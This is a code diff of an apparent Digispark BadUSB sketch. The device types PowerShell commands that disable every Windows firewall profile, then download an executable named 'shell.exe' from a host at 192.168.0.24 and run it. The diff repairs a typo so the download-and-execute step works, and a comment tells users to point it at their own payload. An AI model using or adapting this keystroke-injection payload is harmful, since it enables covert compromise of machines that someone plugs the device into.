@@ -19,7 +19,7 @@ void loop() {
   DigiKeyboard.println("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
   DigiKeyboard.delay(300);
   // change 'http://192.168.0.24/shell.exe' to wherever you wish to download your executable from
-  DigiKeyboard.println("$d = New-Object System.Net.WebClient;$f = 'FILENAME.exe';$url='http://192.168.0.24/shell.exe';d.DownloadFile($url,$f);$e = New-Object -com shell.application; $e.shellexecute($f);exit;");
+  DigiKeyboard.println("$d = New-Object System.Net.WebClient;$f = 'FILENAME.exe';$url='http://192.168.0.24/shell.exe';$d.DownloadFile($url,$f);$e = New-Object -com shell.application; $e.shellexecute($f);exit;");
   DigiKeyboard.delay(500);
   while(1);
 }
